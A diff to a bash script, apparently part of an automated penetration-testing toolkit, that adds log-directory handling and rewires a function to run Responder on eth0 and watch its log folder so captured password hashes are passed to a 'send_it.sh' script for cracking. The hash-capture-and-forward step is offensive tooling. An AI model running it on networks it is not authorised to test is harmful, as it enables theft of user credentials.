@@ -31,9 +31,11 @@ fi
 
 #make a dir for logs
 #after running into directory collisions, let's do a basic directory check instead of just mkdir and letting it error if it alreadt exists
+echo -e "Making sure a log directory exists - if not, ;et's create it"
 DIRECTORY="./autopwn_logs"
 if [ ! -d "$DIRECTORY" ]; then
   echo -e "Creating a log directory because I guess we're supposed to and it's cleaner"
+  mkdir autopwn_logs
 fi
 
 
@@ -79,7 +81,7 @@ more_hashes_plz(){
     
     #only when hashes are found, run the cracker
     echo -e "Running responder and setting up inotifywait service. In theory, anyway, this should announce when new hashes are found!"
-    inotifywait -m -e create /usr/share/responder/logs/SMB*.txt && wall "got some hashes! MAke sure they send correctly" && ./send_it.sh
+    inotifywait /usr/share/responder/logs/ -e create && ./send_it.sh && echo -e "inotify send over some hashes.... but you prolly need to restart the command now"
     responder -I eth0
   }
 
@@ -102,8 +104,3 @@ more_enum_plz
 more_hashes_plz
 
 #i_can_haz_cracks
-
-
-
-
-
